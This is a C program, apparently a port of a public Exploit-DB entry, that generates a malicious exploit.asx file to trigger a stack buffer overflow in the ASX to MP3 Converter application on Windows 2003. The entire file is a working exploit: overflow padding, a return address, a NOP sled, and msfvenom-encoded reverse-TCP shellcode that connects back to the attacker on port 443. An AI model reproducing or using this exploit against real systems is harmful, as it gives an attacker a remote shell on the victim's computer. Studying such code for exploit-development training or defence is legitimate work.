/*
ASX to MP3 Converter SOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
holahola ~ https://www.exploit-db.com/exploits/38382/
Winblows 2k3
*/

#include <stdio.h>
#include <windows.h>
#include <malloc.h>

int main() {

    int i;
    char *overwrite_offset = malloc(239);
    for(i = 0; i < 239; i += 1) {
        char padding[] = "\x41";
        memcpy(overwrite_offset + i, padding, strlen(padding));
    }

    char retn[] = "\x9d\x78\x03\x10";
    char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled    
    "\xd9\xe5\xd9\x74\x24\xf4\xbe\xb0\x9f\xf4\xf1\x5d\x31\xc9\xb1" // msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x09\x0a\x1a\x25"
    "\x52\x83\xed\xfc\x31\x75\x13\x03\xc5\x8c\x16\x04\xd9\x5b\x54"
    "\xe7\x21\x9c\x39\x61\xc4\xad\x79\x15\x8d\x9e\x49\x5d\xc3\x12"
    "\x21\x33\xf7\xa1\x47\x9c\xf8\x02\xed\xfa\x37\x92\x5e\x3e\x56"
    "\x10\x9d\x13\xb8\x29\x6e\x66\xb9\x6e\x93\x8b\xeb\x27\xdf\x3e"
    "\x1b\x43\x95\x82\x90\x1f\x3b\x83\x45\xd7\x3a\xa2\xd8\x63\x65"
    "\x64\xdb\xa0\x1d\x2d\xc3\xa5\x18\xe7\x78\x1d\xd6\xf6\xa8\x6f"
    "\x17\x54\x95\x5f\xea\xa4\xd2\x58\x15\xd3\x2a\x9b\xa8\xe4\xe9"
    "\xe1\x76\x60\xe9\x42\xfc\xd2\xd5\x73\xd1\x85\x9e\x78\x9e\xc2"
    "\xf8\x9c\x21\x06\x73\x98\xaa\xa9\x53\x28\xe8\x8d\x77\x70\xaa"
    "\xac\x2e\xdc\x1d\xd0\x30\xbf\xc2\x74\x3b\x52\x16\x05\x66\x3b"
    "\xdb\x24\x98\xbb\x73\x3e\xeb\x89\xdc\x94\x63\xa2\x95\x32\x74"
    "\xc5\x8f\x83\xea\x38\x30\xf4\x23\xff\x64\xa4\x5b\xd6\x04\x2f"
    "\x9b\xd7\xd0\xe0\xcb\x77\x8b\x40\xbb\x37\x7b\x29\xd1\xb7\xa4"
    "\x49\xda\x1d\xcd\xe0\x21\xf6\x32\x5c\x5e\xf5\xdb\x9f\xa0\xf8"
    "\xa0\x29\x46\x90\xc6\x7f\xd1\x0d\x7e\xda\xa9\xac\x7f\xf0\xd4"
    "\xef\xf4\xf7\x29\xa1\xfc\x72\x39\x56\x0d\xc9\x63\xf1\x12\xe7"
    "\x0b\x9d\x81\x6c\xcb\xe8\xb9\x3a\x9c\xbd\x0c\x33\x48\x50\x36"
    "\xed\x6e\xa9\xae\xd6\x2a\x76\x13\xd8\xb3\xfb\x2f\xfe\xa3\xc5"
    "\xb0\xba\x97\x99\xe6\x14\x41\x5c\x51\xd7\x3b\x36\x0e\xb1\xab"
    "\xcf\x7c\x02\xad\xcf\xa8\xf4\x51\x61\x05\x41\x6e\x4e\xc1\x45"
    "\x17\xb2\x71\xa9\xc2\x76\x91\x48\xc6\x82\x3a\xd5\x83\x2e\x27"
    "\xe6\x7e\x6c\x5e\x65\x8a\x0d\xa5\x75\xff\x08\xe1\x31\xec\x60"
    "\x7a\xd4\x12\xd6\x7b\xfd";

    int buffer_size = _msize(overwrite_offset) + strlen(retn) + strlen(shellcode);
    char *buffer = malloc(buffer_size);

    memcpy(buffer, overwrite_offset, _msize(overwrite_offset));
    memcpy(buffer + _msize(overwrite_offset), retn, strlen(retn));
    memcpy(buffer + _msize(overwrite_offset) + strlen(retn), shellcode, strlen(shellcode));
    memset(buffer + buffer_size - 1, 0x00, 1);

    FILE * fp;
    fp = fopen("exploit.asx","w");
    fprintf(fp, buffer);
    fclose(fp);

    return 0;

}
